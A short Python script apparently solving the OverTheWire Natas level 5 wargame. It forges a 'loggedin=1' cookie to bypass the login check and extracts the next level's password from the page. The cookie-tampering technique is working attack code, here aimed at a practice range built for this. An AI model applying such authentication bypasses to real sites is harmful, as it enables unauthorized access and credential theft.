#! /usr/bin/python

import requests
import re

username = 'natas5'
password = ''

headers = {'Cookie':'loggedin=1'}

r = requests.get('http://natas5.natas.labs.overthewire.org/', auth=(username, password), headers=headers)
pattern = r'The password for natas6 is (\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
